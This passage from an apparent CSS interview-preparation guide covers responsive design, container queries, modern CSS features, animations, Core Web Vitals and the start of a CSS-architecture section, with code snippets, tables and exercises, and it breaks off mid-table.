- Percentage `gap` and track sizes resolve against the container's content box.
- `masonry` layout is being standardised as "grid lanes"; treat it as experimental and keep a column-based fallback.

### Tricky questions

**How many rows are created?**

```css
.g { display: grid; grid-template-columns: repeat(3, 1fr); grid-template-rows: 100px; }
/* 7 children */
```

**3 rows:** one explicit (100px) and two implicit rows sized `auto`, because 7 items need 3 rows of 3.

**An item with `grid-column: 5` in a 3-column grid?** The grid gains implicit columns 4 and 5 (sized by `grid-auto-columns`). No error.

**Why doesn't `height: 100%` work inside a grid cell?** It does when the row track has a definite size; with an `auto` row the item is stretched by default anyway, so remove `height` and rely on `align-self: stretch`.

### Debugging exercise

A two-column layout overflows the viewport on mobile when a code block is inside the main column:

```css
.page { display: grid; grid-template-columns: 1fr 300px; }
@media (width < 40rem) { .page { grid-template-columns: 1fr; } }
pre { white-space: pre; }
```

**Root cause:** `1fr` has an `auto` minimum, so the column is at least as wide as the longest code line.

**Fix:** `grid-template-columns: minmax(0, 1fr) 300px;` (and `minmax(0, 1fr)` in the media query), plus `pre { overflow-x: auto; }` so the code block scrolls inside its column.

### Revision summary

- `1fr` = `minmax(auto, 1fr)`; use `minmax(0, 1fr)` to stop content overflow.
- Implicit tracks are sized by `grid-auto-rows/columns`.
- `auto-fit` collapses empty tracks; `auto-fill` keeps them.
- `min(200px, 100%)` inside `minmax()` prevents narrow-container overflow.
- `dense` and placement change visual order only.
- Subgrid aligns nested content to parent tracks.

## Part 9 — Responsive Web Design

Modern responsive design means fluid layouts by default, a few content-driven breakpoints, components that respond to their container rather than the viewport, and images the browser can pick for the device. Media queries are now the last resort, not the first tool.

### Q1 \[INT\] Why is the viewport meta tag required?

```html
<meta name="viewport" content="width=device-width, initial-scale=1">
```

Without it, mobile browsers lay the page out at a virtual \~980px width and zoom out, so your media queries never fire. Never add `user-scalable=no` or `maximum-scale=1`: blocking zoom fails WCAG 1.4.4.

### Q2 \[INT\] Mobile-first vs desktop-first

```css
/* Mobile-first: base styles for small screens, add complexity upward */
.grid { display: grid; gap: 1rem; }
@media (width >= 40rem) { .grid { grid-template-columns: 1fr 1fr; } }
@media (width >= 64rem) { .grid { grid-template-columns: repeat(3, 1fr); } }
```

**Why mobile-first:** small screens get the least CSS to override, the simplest layout is the default if a query fails, and it forces content prioritisation. **Range syntax** (`width >= 40rem`) is Baseline since 2023 and avoids the off-by-one gap of `max-width: 639px` / `min-width: 640px`.

**Breakpoints in `em`/`rem`** respond to the user's default font size; pixel breakpoints don't in all browsers.

### Q3 \[ADV\] How do you choose breakpoints?

By **content**, not devices. Widen the browser until the layout looks wrong (lines too long, cards too stretched, nav wrapping), add a breakpoint there. Device widths change yearly; content constraints don't. Many layouts need only 2–3 breakpoints once Grid with `auto-fit` and `clamp()` handle the in-between.

&#91;embedded content: mobile-first breakpoints · 3 layouts, 2 switch points\]

### Q4 \[ADV\] Container queries vs media queries

Media queries ask about the **viewport**. Container queries ask about the **component's container**, so the same card adapts whether it sits in a narrow sidebar or a wide main column.

```css
.card-wrap { container: card / inline-size; }  /* name / type */

.card { display: grid; gap: 1rem; }
@container card (width >= 28rem) {
  .card { grid-template-columns: 10rem 1fr; }
}
.card h3 { font-size: clamp(1rem, 4cqi, 1.5rem); }  /* 1cqi = 1% of container inline size */
```

**Rules and limits:** an element can't query itself — only an ancestor container. `container-type: inline-size` applies size containment on the inline axis, so the container can no longer be sized by its own children's width; give it a width from its parent (block flow or a grid/flex track). It also becomes a containing block for absolute/fixed descendants. Size queries are Baseline since 2023. **Style queries** for custom properties (`@container style(--variant: compact)`) are supported in Chromium and Safari but not yet Baseline.

**Use media queries for:** page-level layout, user preferences (`prefers-*`), input capabilities. **Use container queries for:** reusable components.

### Q5 \[ADV\] How does the browser pick from `srcset` and `sizes`?

```html
<img
  src="hero-800.jpg"
  srcset="hero-400.jpg 400w, hero-800.jpg 800w, hero-1600.jpg 1600w"
  sizes="(width >= 64rem) 50vw, 100vw"
  width="1600" height="900"
  alt="Team planning session around a whiteboard">
```

1. Evaluate `sizes` top-down; first matching condition gives the **slot width** (here: 100vw on a 375px phone = 375 CSS px).
2. Multiply by device pixel ratio (DPR 3 → 1125 device px needed).
3. Pick a candidate from `srcset` — typically the smallest ≥ the need (1600w). The browser **may** choose differently based on network, data saver, or a larger version already in cache.

&#91;embedded content: responsive image selection · 3 steps\]

**Common mistakes:** omitting `sizes` (defaults to `100vw`, so desktop sidebars download huge images); writing `sizes` that don't match the CSS; using `x` descriptors (`1x, 2x`) for fluid images — `x` suits fixed-size images like logos.

### Q6 \[INT\] When do you need `<picture>`?

For **art direction** (a different crop at different sizes) and **format fallback**. For simple resolution switching, `img srcset` is enough.

```html
<picture>
  <source media="(width < 40rem)" srcset="hero-portrait.avif" type="image/avif">
  <source srcset="hero.avif" type="image/avif">
  <source srcset="hero.webp" type="image/webp">
  <img src="hero.jpg" alt="…" width="1600" height="900">
</picture>
```

The first matching `<source>` wins. The `<img>` is required: it renders the result and carries `alt`, `width`, `height`, `loading`, and CSS styling.

### Q7 \[INT\] `100vh` vs `dvh`, `svh`, `lvh`

On mobile, browser toolbars grow and shrink while scrolling. `100vh` equals the **largest** viewport (toolbars hidden), so a full-height hero is cut off behind the address bar.

| Unit | Equals the viewport when… | Use for |
| --- | --- | --- |
| `svh` | toolbars are **shown** (smallest) | Content that must be fully visible on load |
| `lvh` | toolbars are **hidden** (largest) | Backgrounds that must never show a gap |
| `dvh` | current size; updates as toolbars move | Full-screen app shells; may cause reflow while scrolling |

All Baseline since 2023. Typical pattern: `min-height: 100svh;` with a `100vh` fallback line first.

### Q8 \[INT\] Responsive typography

```css
:root { font-size: 100%; }               /* respect user default (usually 16px) */
body  { font-size: clamp(1rem, .95rem + .25vw, 1.125rem); line-height: 1.5; }
h1    { font-size: clamp(2rem, 1.5rem + 2.5vw, 3.5rem); line-height: 1.1; }
.prose { max-width: 65ch; }
```

Keep a `rem` term in every fluid formula so zoom works; cap line length with `ch`; use unitless `line-height` so it scales with each element's font size.

### Q9 \[ADV\] User-preference and capability media features

```css
@media (hover: hover) and (pointer: fine) { .card:hover { transform: translateY(-2px); } }
@media (pointer: coarse) { .icon-btn { min-width: 44px; min-height: 44px; } }
@media (prefers-reduced-motion: reduce) {
  *, *::before, *::after { animation-duration: .01ms !important; animation-iteration-count: 1 !important;
    transition-duration: .01ms !important; scroll-behavior: auto !important; }
}
@media (prefers-color-scheme: dark) { :root { --bg: #111; --fg: #eee; } }
@media (prefers-contrast: more) { :root { --border: #000; } }
```

**Why not detect "mobile" by width?** A 1024px iPad has touch; a small desktop window has a mouse. Query the capability (`hover`, `pointer`) you actually depend on.

### Q10 \[EXP\] Follow-up: `container-type: size` vs `inline-size`

`inline-size` applies containment on the inline axis only; the container's height still comes from its content, so it's safe for most components. `size` contains both axes: the element is laid out as if it had **no content** for sizing purposes, so without an explicit height it collapses to 0. Use `size` only for boxes with a definite height (a fixed-height panel, a grid cell with a sized row) when you need `@container (height > …)` or `cqb` units. Container units used outside any container fall back to the small viewport units (`svw`/`svh`).

### Tricky questions

- **Both `@media (max-width: 600px)` and `(min-width: 600px)` match at exactly 600px.** Use range syntax: `(width < 600px)` and `(width >= 600px)`.
- **A container query doesn't fire.** The element is querying itself, or no ancestor has `container-type`, or the container is `display: inline` / has no definite inline size.
- **Browser downloaded the 1600w image on a phone.** Missing `sizes`, a high DPR, or a cached larger file. Check the Network panel and `currentSrc`.
- **`orientation: landscape` on desktop?** True for almost every desktop window. Orientation is about aspect ratio, not devices.

### Exercise

Make a card list that shows 1 column in narrow containers, a horizontal card layout above 28rem container width, and 3 cards per row in the page's main area on wide screens — without any viewport media query.

**Answer outline:** the list uses `grid-template-columns: repeat(auto-fit, minmax(min(18rem, 100%), 1fr))`; each card wrapper has `container-type: inline-size`; inside, `@container (width >= 28rem)` switches the card to a two-column grid.

### When to use what

| Choice | Use when | Avoid when | Alternative |
| --- | --- | --- | --- |
| Media query | Page layout, user preferences, input capabilities | Reusable components placed in varied containers | Container query |
| Container query | Components that appear in sidebars and main areas | Page shell; elements that must query themselves | Media query, intrinsic layout |
| Intrinsic layout (`auto-fit`, `min()`, flex-wrap) | Most grids and clusters | Exact designed switch points | Explicit breakpoints |
| `<picture>` | Art direction, format fallback | Plain resolution switching | `img srcset sizes` |
| `dvh` | App shells that must track toolbars | Long documents (resizes while scrolling) | `svh` / `lvh` |

### Revision summary

- Viewport meta always; never disable zoom.
- Mobile-first, range syntax, content-driven `rem` breakpoints.
- Container queries for components; media queries for page and preferences.
- `srcset` + accurate `sizes`; `<picture>` for art direction and formats.
- `svh`/`dvh`/`lvh` instead of `100vh` on mobile.
- Query capabilities (`hover`, `pointer`), not device types.

## Part 10 — Modern CSS

Since 2022 CSS has absorbed most of what used to need Sass or JavaScript: nesting, parent selection, container queries, layers, typed variables, popovers and anchor positioning. Senior candidates are expected to know which features are safe today and how to ship the rest as progressive enhancement.

### Feature maturity at a glance (late 2026)

| Feature | Status | Safe to rely on? |
| --- | --- | --- |
| Nesting, `:has()`, `:is()`/`:where()`, `@layer`, container size queries, `aspect-ratio`, logical properties, `dvh` units | Baseline (widely available) | Yes |
| `@property`, `popover`, `@starting-style`, `text-wrap: balance`, `light-dark()`, subgrid, `content-visibility` | Baseline (newly available, 2023–2024) | Yes, with a quick check of your support matrix |
| Same-document view transitions, anchor positioning, `field-sizing`, scroll-driven animations, container style queries | Shipping in some engines; not all yet Baseline | Progressive enhancement only |
| Masonry / grid lanes, `reading-flow`, `@function`, `if()` | Experimental or single-engine | Not in production without fallbacks |

Browser versions move fast; verify current status on MDN's Baseline badge or webstatus.dev before you commit.

### Q1 \[INT\] Native CSS nesting — any differences from Sass?

```css
.card {
  padding: 1rem;
  & h3 { margin: 0; }          /* & optional for element selectors since 2023's relaxed syntax */
  &:hover { box-shadow: var(--shadow-2); }
  .dark & { background: #222; }   /* parent-context selector */
  @media (width >= 40rem) { padding: 2rem; }
}
```

**Differences:** no string concatenation (`&__title` is invalid; BEM suffixes need Sass). Nested selectors behave like `:is()`, so `.a, #b { & .c {} }` gets the specificity of `#b` for both. Keep nesting to 2–3 levels to avoid specificity creep.

### Q2 \[ADV\] What can `:has()` do, and what does it cost?

`:has()` selects an element based on its descendants, following siblings, or state — the long-missing "parent selector".

```css
/* Card with an image gets a different layout */
.card:has(> img) { grid-template-columns: 8rem 1fr; }

/* Style a field wrapper when its input is invalid after interaction */
.field:has(input:user-invalid) .hint { color: var(--danger); }

/* Lock page scroll while a modal dialog is open */
body:has(dialog[open]) { overflow: hidden; }

/* Previous-sibling selection */
h2:has(+ p) { margin-block-end: .25rem; }
```

**Cost:** the browser must re-evaluate `:has()` when descendants change. Anchor it to a specific subject (`.card:has(...)`, not `:has(...)` or `body:has(.x .y .z)` matched across the whole page) and prefer the child combinator `>` to limit the search.

### Q3 \[INT\] Logical properties — why bother?

Physical properties (`margin-left`, `padding-top`) are fixed to the screen. Logical ones follow the writing mode and direction, so a layout mirrors correctly for Arabic or Hebrew (RTL) and adapts to vertical scripts.

| Physical | Logical (horizontal LTR) |
| --- | --- |
| `margin-left` / `margin-right` | `margin-inline-start` / `margin-inline-end` |
| `padding-top` / `padding-bottom` | `padding-block-start` / `padding-block-end` |
| `width` / `height` | `inline-size` / `block-size` |
| `left: 0; right: 0` | `inset-inline: 0` |
| `text-align: left` | `text-align: start` |
| `border-top-left-radius` | `border-start-start-radius` |

Use logical properties by default in a design system; physical ones only when the direction is genuinely physical (a shadow cast from a fixed light source).

### Q4 \[INT\] `aspect-ratio`, `object-fit`, `object-position`

```css
.thumb { aspect-ratio: 4 / 3; width: 100%; }
.thumb img { width: 100%; height: 100%; object-fit: cover; object-position: 50% 30%; }
.video { aspect-ratio: 16 / 9; }
```

`object-fit: cover` crops to fill; `contain` letterboxes; `fill` (default) stretches. `aspect-ratio` is a *preferred* ratio: content taller than the box will still grow it unless you set `min-height: 0` or `overflow: hidden`. Width/height attributes on `<img>` automatically produce an `aspect-ratio` (Part 12), preventing layout shift.

### Q5 \[ADV\] `content-visibility: auto` — what does it do?

It lets the browser skip layout and paint for off-screen sections until they approach the viewport — a large win for long pages and feeds.

```css
.article-section { content-visibility: auto; contain-intrinsic-size: auto 800px; }
```

`contain-intrinsic-size` gives a placeholder height so the scrollbar doesn't jump; the `auto` keyword remembers the last rendered size. Caveats: content stays searchable and accessible, but anchor scrolling and `scrollIntoView` measurements can be inaccurate for skipped sections.

### Q6 \[INT\] `@supports` and progressive enhancement

```css
.layout { display: flex; flex-wrap: wrap; }                 /* baseline */
@supports (display: grid) { .layout { display: grid; } }     /* enhancement */

@supports not (anchor-name: --a) { .tooltip { /* fallback position */ } }
@supports selector(:has(a)) { /* :has-based styles */ }
```

CSS already ignores declarations it doesn't understand, so writing the fallback first and the modern value second often needs no `@supports` at all:

```css
.hero { min-height: 100vh; min-height: 100svh; }
```

### Q7 \[ADV\] Popover API and anchor positioning

```html
<button popovertarget="menu" style="anchor-name: --menu-btn">Options</button>
<div id="menu" popover>
  <a href="/profile">Profile</a> <a href="/logout">Log out</a>
</div>
```

```css
#menu {
  position-anchor: --menu-btn;
  position-area: bottom span-right;
  position-try-fallbacks: flip-block;   /* flip above if no room below */
  margin: 4px 0 0;
}
```

**`popover`** (Baseline 2024) gives top-layer rendering (no `z-index` battles), light dismiss (click outside, Escape) and focus return — without JavaScript. **Anchor positioning** ties the popover to its button in pure CSS. It ships in Chromium-based browsers and Safari 26; check Firefox status and keep a fallback (e.g. a fixed centred position, or Floating UI in JS) for unsupported browsers.

### Q8 \[INT\] Scroll snapping

```css
.carousel { display: flex; gap: 1rem; overflow-x: auto; scroll-snap-type: x mandatory;
            overscroll-behavior-x: contain; scroll-padding-inline: 1rem; }
.carousel > * { flex: 0 0 85%; scroll-snap-align: start; }
```

`mandatory` always snaps; `proximity` only snaps near a point (safer when items are taller than the viewport, so content isn't unreachable). Add keyboard-reachable controls; snap alone isn't accessible navigation.

### Q9 \[ADV\] Other modern features worth naming

- `@starting-style` + `transition-behavior: allow-discrete` — animate from `display: none` (entry/exit animations for popovers and dialogs).
- `text-wrap: balance` for headings; `text-wrap: pretty` to avoid orphans in body text.
- `light-dark(#fff, #111)` with `color-scheme: light dark` for one-line theme values.
- `color-mix(in oklch, var(--brand) 80%, white)` and `oklch()` for perceptually even colour scales.
- `accent-color` to theme native checkboxes, radios and range inputs.
- View transitions for animated page and state changes; progressive enhancement where unsupported.

### Tricky questions

- **Does `&__title` work in native nesting?** No; `&` is a selector, not a string.
- **`.a:has(.b)` specificity?** (0,2,0): `:has()` takes its argument's specificity.
- **Will an unsupported property inside `@supports` break the rest of the stylesheet?** No. Unknown rules and declarations are dropped individually.
- **Can `:has()` be nested inside `:has()`?** No; nested `:has()` is invalid.

### When to use what

| Choice | Use when | Avoid when | Alternative |
| --- | --- | --- | --- |
| Native nesting | Grouping states and media queries of one component | Deep nesting (> 3 levels); BEM string building | Flat classes, Sass |
| `:has()` | Parent/sibling-dependent styling scoped to a component | Page-wide `body:has(...)` checks on large DOMs | A class set by JS or server |
| `popover` | Menus, toasts, non-modal pickers | Modal flows needing a trapped focus | `<dialog>` + `showModal()` |
| Anchor positioning | Tooltips and menus in supporting browsers | Required behaviour with no fallback | Floating UI (JS) as fallback |
| `content-visibility: auto` | Long pages and feeds | Small pages; content measured by scripts | Virtualisation |

### Revision summary

- Know the Baseline tier of each feature; enhance progressively above it.
- Native nesting ≈ Sass minus string concatenation.
- `:has()` = parent/previous-sibling selector; scope it tightly.
- Logical properties by default for RTL and writing modes.
- `popover` + anchor positioning replace much JS positioning; keep fallbacks.

## Part 11 — Animations & Visual Effects

Smooth animation means changing only properties the compositor can handle (`transform`, `opacity`), keeping each frame under \~16 ms, and always honouring `prefers-reduced-motion`. Transitions are for A→B state changes; keyframe animations are for anything with more steps, loops, or no trigger.

### Q1 \[INT\] Transitions vs keyframe animations

|  | `transition` | `@keyframes` + `animation` |
| --- | --- | --- |
| Trigger | A property value changes (hover, class toggle) | Runs when applied; can autoplay and loop |
| Steps | Start → end only | Any number of keyframes |
| Reversal | Automatic when state reverts (from current position) | Must be designed |
| Use for | Hover, focus, open/close, theme swaps | Spinners, skeleton shimmer, attention cues, entrance sequences |

```css
.btn { transition: background-color .2s ease, transform .2s ease; }
.btn:hover { background-color: var(--brand-600); }
.btn:active { transform: scale(.97); }

@keyframes spin { to { transform: rotate(1turn); } }
.spinner { animation: spin .8s linear infinite; }
```

**Never write `transition: all`.** It animates unintended properties (including layout ones) and makes later changes unpredictable.

### Q2 \[ADV\] Why are `transform` and `opacity` cheap but `left` and `height` expensive?

Animating `left`, `top`, `width`, `height` or `margin` changes geometry, so every frame re-runs **layout and paint** on the main thread, which also runs JavaScript. If a frame takes longer than \~16 ms (at 60 Hz), it is dropped.

`transform` and `opacity` on an element with its own compositor layer are applied by the **compositor thread** on the GPU, without layout or paint. They stay smooth even while JS is busy.

```css
/* Janky */
.drawer { left: -300px; transition: left .3s; }
.drawer.open { left: 0; }

/* Smooth */
.drawer { transform: translateX(-100%); transition: transform .3s ease-out; }
.drawer.open { transform: none; }
```

**Animating height (accordions):** use `grid-template-rows: 0fr → 1fr` on a grid wrapper, or `interpolate-size: allow-keywords` to transition to `height: auto` where supported (Chromium only at time of writing), or the FLIP technique with transforms.

```css
.panel { display: grid; grid-template-rows: 0fr; transition: grid-template-rows .3s; }
.panel.open { grid-template-rows: 1fr; }
.panel > .inner { overflow: hidden; }
```

### Q3 \[INT\] Timing functions

- `ease-out` — fast start, gentle stop. Best for elements **entering** (they respond instantly).
- `ease-in` — slow start. For elements **leaving**.
- `ease-in-out` — for things moving across the screen.
- `linear` — spinners, progress, scroll-linked effects.
- `cubic-bezier(.2, .8, .2, 1)` — custom curves; `steps(8)` for sprite animations; `linear()` for spring-like curves (Baseline 2023).

Keep UI durations short: 150–250 ms for small state changes, up to \~400 ms for large panels.

### Q4 \[ADV\] How do you animate elements in and out of `display: none`?

Historically you couldn't: `display` toggled instantly. Now:

```css
.toast {
  transition: opacity .25s, transform .25s, display .25s allow-discrete, overlay .25s allow-discrete;
  opacity: 1; transform: none;
}
.toast[hidden] { display: none; opacity: 0; transform: translateY(8px); }

@starting-style {
  .toast { opacity: 0; transform: translateY(8px); }   /* where to animate in from */
}
```

`@starting-style` defines the "before" style on first render; `allow-discrete` keeps the element displayed until the exit transition ends. Baseline since 2024. Older browsers simply show and hide without animation — a safe fallback.

### Q5 \[SR\] How do you make animation accessible?

- Respect `prefers-reduced-motion: reduce`: remove parallax, large movement, zooms and auto-play; keep subtle fades (opacity is generally safe). WCAG 2.3.3 covers motion from interaction (AAA), and many vestibular users rely on it.
- Nothing should flash more than 3 times per second (WCAG 2.3.1, level A).
- Any auto-playing animation longer than 5 seconds needs a pause control (WCAG 2.2.2).
- Don't use animation as the only way to convey state.

```css
/* Motion opt-in pattern: no motion unless the user hasn't asked to reduce it */
@media (prefers-reduced-motion: no-preference) {
  .card { transition: transform .2s ease-out; }
  .card:hover { transform: translateY(-4px); }
}
```

### Q6 \[INT\] Build a skeleton loader

```html
<div class="skeleton" aria-hidden="true">
  <div class="sk-line" style="width: 60%"></div>
  <div class="sk-line"></div>
  <div class="sk-line" style="width: 80%"></div>
</div>
<p role="status" class="visually-hidden">Loading orders…</p>
```

```css
.sk-line { height: 1rem; margin-block: .5rem; border-radius: 4px;
  background: linear-gradient(90deg, var(--sk) 25%, var(--sk-hi) 50%, var(--sk) 75%) 0 0 / 200% 100%;
  animation: shimmer 1.4s linear infinite; }
@keyframes shimmer { to { background-position: -200% 0; } }
@media (prefers-reduced-motion: reduce) { .sk-line { animation: none; } }
```

The skeleton is hidden from screen readers; a polite status message announces the loading state. Size skeletons to match real content so swapping them in causes no layout shift. (Animating `background-position` triggers paint each frame; acceptable for a few small elements, but for large areas animate a `transform` on a pseudo-element instead.)

### Q7 \[ADV\] Scroll-driven animations

```css
@keyframes grow { from { transform: scaleX(0); } to { transform: scaleX(1); } }
.progress { position: fixed; inset: 0 0 auto; height: 4px; transform-origin: 0 50%;
            animation: grow linear both; animation-timeline: scroll(root); }

.reveal { animation: fade-in linear both; animation-timeline: view(); animation-range: entry 0% cover 30%; }
```

They run off the main thread when animating compositor properties — smoother than scroll-event JS. Supported in Chromium-based browsers and Safari 26; Firefox has it behind a flag at time of writing. Wrap in `@supports (animation-timeline: scroll())` and keep content visible without it.

### Q8 \[EXP\] Follow-up: why can a `transform` animation still jank?

- **It is driven from JavaScript** (`requestAnimationFrame` updating `style.transform`): it then shares the main thread with scripts, so a long task freezes it. CSS animations and the Web Animations API (`el.animate()`) can run on the compositor.
- **Late layer promotion:** without `will-change`, the browser may promote the element at animation start, causing a first-frame hitch.
- **Huge layers** (full-screen blurred backgrounds, large `filter` or `backdrop-filter` areas) exceed GPU memory or need repaint each frame.
- **Mixed properties:** animating `transform` together with `box-shadow` or `width` brings paint or layout back.

Diagnose with DevTools Performance (look for "Animation" running on the main thread) and Rendering → Layer borders.

### Tricky questions

- **Why does my transition not run when I add an element and its class in the same frame?** The browser never computed a "before" style. Use `@starting-style`, or force a style read between the insert and the class change.
- **Why does `transform` on a parent break `position: fixed` children?** The transform makes it their containing block (Part 4).
- **Why does text blur during a scale animation?** The layer is rasterised at one scale and stretched. Animate from a smaller element scaling up to 1, or avoid scaling text-heavy elements.
- **Does `will-change: transform` on every card speed things up?** No; it costs memory per layer. Apply it to what is about to animate.

### Revision summary

- Transition = state A→B; keyframes = sequences and loops.
- Animate `transform`/`opacity`; never `transition: all`.
- `ease-out` in, `ease-in` out; 150–250 ms for UI.
- `@starting-style` + `allow-discrete` for enter/exit from `display: none`.
- Honour `prefers-reduced-motion`; no flashes over 3 per second.

## Part 12 — Rendering Performance & Core Web Vitals

Google's Core Web Vitals measure three things users feel: how fast the main content appears (LCP), how fast the page reacts (INP), and how much it jumps (CLS). HTML and CSS decisions drive all three; Part 2 covered the pipeline, this part covers fixing real pages.

### Q1 \[INT\] What are the Core Web Vitals and their thresholds?

| Metric | Measures | Good (75th percentile of real users) | Main HTML/CSS levers |
| --- | --- | --- | --- |
| **LCP** Largest Contentful Paint | Time until the biggest image or text block renders | ≤ 2.5 s | Discoverable LCP image, `fetchpriority`, small render-blocking CSS, fast fonts |
| **INP** Interaction to Next Paint | Delay from tap/click/key to next frame (replaced FID in 2024) | ≤ 200 ms | Less JS on main thread, cheaper style recalc and layout, `content-visibility` |
| **CLS** Cumulative Layout Shift | Unexpected movement of visible content | ≤ 0.1 | Image dimensions, reserved space, font metric overrides, no late banners |

Field data (CrUX, RUM) is what counts; Lighthouse is a lab approximation useful for debugging.

### Q2 \[ADV\] How do you speed up LCP from HTML and CSS?

```html
<head>
  <link rel="preconnect" href="https://cdn.example.com" crossorigin>
  <style>/* critical above-the-fold CSS, a few KB */</style>
  <link rel="stylesheet" href="/app.css">
</head>
<body>
  <img src="/hero-1200.avif" srcset="…" sizes="100vw"
       width="1200" height="600" alt="…"
       fetchpriority="high" decoding="async">
</body>
```

1. **Make the LCP image discoverable in HTML** (not a CSS `background-image` or JS-injected), so the preload scanner finds it immediately.
2. **`fetchpriority="high"`** on it; **never `loading="lazy"`** on above-the-fold images.
3. **Shrink render-blocking CSS:** inline critical CSS, split route CSS, remove unused rules.
4. **Serve modern formats** (AVIF/WebP) at the right size via `srcset`.
5. For a CSS background LCP, add `<link rel="preload" as="image" imagesrcset="…" imagesizes="…">`.

### Q3 \[ADV\] What causes layout shift and how do you prevent it?

| Cause | Fix |
| --- | --- |
| Images/video without dimensions | `width` and `height` attributes (browser derives `aspect-ratio`), or CSS `aspect-ratio` |
| Ads, embeds, iframes loading late | Reserve space with `min-height` or an aspect-ratio container |
| Web font swap changing text size | `font-display: optional`, or metric overrides on the fallback (below) |
| Banners / cookie bars injected at the top | Overlay them (`position: fixed`) or reserve space in the initial HTML |
| Content inserted above the viewport after load | Insert below, or only after user interaction (shifts within 500 ms of input don't count) |
| Animating `top`/`height` | Animate `transform` (doesn't count as a layout shift) |

```css
img, video { max-width: 100%; height: auto; }   /* keeps the attribute-derived ratio responsive */
```

### Q4 \[ADV\] Font loading strategy

```html
<link rel="preload" href="/fonts/inter-var.woff2" as="font" type="font/woff2" crossorigin>
```

```css
@font-face {
  font-family: "Inter";
  src: url("/fonts/inter-var.woff2") format("woff2");
  font-weight: 100 900;
  font-display: swap;
  unicode-range: U+0000-00FF;   /* subset: only download for Latin */
}
@font-face {                      /* fallback tuned to match Inter's metrics */
  font-family: "Inter Fallback";
  src: local("Arial");
  size-adjust: 107%; ascent-override: 90%; descent-override: 22%;
}
body { font-family: "Inter", "Inter Fallback", system-ui, sans-serif; }
```

| `font-display` | Behaviour | Trade-off |
| --- | --- | --- |
| `block` | Invisible text up to \~3 s | Bad for LCP; only for icon fonts |
| `swap` | Fallback immediately, swap when loaded | Good LCP; CLS unless metrics match |
| `optional` | Use the font only if it arrives in \~100 ms | No CLS; first visit may show fallback |

Self-host, use WOFF2, subset, prefer one variable font over many static weights, and preload only the 1–2 fonts used above the fold. **Short interview answer to "how do you avoid font CLS?":** a metric-matched fallback with `swap`, or `optional`.

### Q5 \[ADV\] Lazy loading done right

```html
<img src="chart.png" width="800" height="450" loading="lazy" alt="…">
<iframe src="https://www.youtube-nocookie.com/embed/…" loading="lazy" title="Product demo"></iframe>
```

Native `loading="lazy"` is Baseline for images and iframes. Always include dimensions, or lazy images collapse to 0 height and shift content when they load. Never lazy-load the LCP image. For heavy embeds, a "facade" (static thumbnail that loads the real iframe on click) saves hundreds of KB.

### Q6 \[SR\] How do you reduce CSS cost at scale?

- **Measure first:** DevTools Coverage tab shows unused bytes per stylesheet; Performance panel shows long "Recalculate Style" and "Layout" tasks.
- **Ship less:** route-level CSS splitting, component-scoped CSS (Modules), tree-shaken utility CSS, removing dead rules from legacy bundles (PurgeCSS-style tools need a safelist for dynamic classes).
- **Critical CSS:** inline only what the first viewport needs (\~10–15 KB budget); load the rest normally. Over-inlining delays HTML and defeats caching.
- **Cheaper recalculation:** reduce DOM size (the biggest lever), avoid broad `:has()` and universal rules that change frequently, toggle classes on the smallest subtree possible, and use `contain: content` or `content-visibility: auto` on independent sections.
- **Budgets in CI:** fail the build if CSS exceeds, say, 50 KB compressed per route.

### Q7 \[SR\] How do you profile a janky interaction?

1. Record in DevTools Performance with CPU throttling (4–6×) to mimic a mid-range phone.
2. Find the long task (>50 ms) after the input. Split it into scripting, style recalc, layout, paint.
3. Purple "Layout" bars with a "Forced reflow" warning → layout thrashing in JS (Part 2).
4. Long "Recalculate Style" with many elements affected → class toggled too high in the tree, or expensive selectors.
5. Large "Paint" areas → enable Rendering → Paint flashing; reduce painted area or promote the animated element.
6. Verify with field data: the `web-vitals` library reports INP with the responsible element.

### Q8 \[EXP\] Follow-up: what makes up INP, and where does CSS hurt it?

INP for one interaction = **input delay** (main thread busy when the user taps) + **processing time** (event handlers) + **presentation delay** (style, layout, paint and commit for the next frame). CSS drives the third part: toggling a class on `body` that restyles 10,000 nodes, a layout of a huge DOM, or expensive paint (large blurs, shadows) all delay the next frame even if the JS handler is quick. Fixes: scope class changes to the smallest subtree, `content-visibility: auto` for off-screen sections, smaller DOMs (virtualise long lists), and yielding long handlers (`scheduler.yield()` where supported, or `setTimeout`) so the visual update paints first.

### Tricky questions

- **Does `display: none` on a lazy image stop it downloading?** Not reliably; browsers may still fetch hidden `<img>` sources. Use `<picture>` with a non-matching `media`, or render it conditionally.
- **Is preloading everything a good idea?** No. Preloads compete for bandwidth with the LCP image and CSS; unused preloads trigger console warnings.
- **Does a `transform` animation cause CLS?** No; CLS only counts layout shifts, and transforms don't change layout.
- **Why is my page's LCP a text block, not the hero image?** The image is smaller than the text block on that viewport, or it was lazy-loaded or hidden. LCP picks the largest visible element.

### Exercise

A product page has LCP 4.1 s (hero is a CSS `background-image`), CLS 0.24 (ad slot and web font). List the fixes in priority order.

**Answer:** (1) Move the hero to an `<img>` with `srcset`, `fetchpriority="high"`, dimensions; (2) inline critical CSS and defer non-critical; (3) reserve the ad slot height; (4) add a metric-matched fallback font or switch to `font-display: optional`; (5) re-measure with field data after deploy.

### When to use what

| Choice | Use when | Avoid when | Alternative |
| --- | --- | --- | --- |
| `font-display: swap` | Brand fonts with metric-matched fallback | No fallback tuning (causes CLS) | `optional` |
| `loading="lazy"` | Below-the-fold images and iframes | LCP / above-the-fold images | `fetchpriority="high"` |
| `content-visibility` | Long independent sections | Above-the-fold content | Smaller DOM |
| Critical CSS inlining | Slow first paint from blocking CSS | Every page with large CSS (kills caching) | Route-split CSS |
| Lighthouse | Debugging in the lab | Proving real-user performance | CrUX, RUM with `web-vitals` |

### Revision summary

- LCP ≤ 2.5 s, INP ≤ 200 ms, CLS ≤ 0.1, at p75 of real users.
- LCP image: in HTML, `fetchpriority="high"`, never lazy.
- Dimensions on every image/iframe; reserve space for late content.
- Fonts: WOFF2, subset, preload few, `swap` + metric overrides or `optional`.
- Measure with Coverage and Performance before optimising.

## Part 13 — CSS Architecture & Maintainability

CSS architecture exists to answer one question: when someone changes a style, what else breaks? Every methodology — BEM, utilities, CSS Modules, CSS-in-JS, layers — is a different answer to scoping, specificity and ownership. Senior interviews want trade-offs, not a favourite.

### Q1 \[INT\] What is BEM and what problem does it solve?

Block, Element, Modifier: `.card`, `.card__title`, `.card--featured`. Every selector is a single class, so specificity stays flat at (0,1,0) and names document ownership.

```css
.card { … }
.card__title { … }
.card--featured .card__title { color: var(--brand); }
```

**Pros:** no build step, predictable specificity, readable in DevTools. **Cons:** verbose, scoping by convention only (nothing stops a name collision), modifiers can explode combinatorially.

### Q2 \[ADV\] Compare the main approaches

| Approach | Scoping | Runtime cost | Strengths | Weaknesses |
| --- | --- | --- | --- | --- |
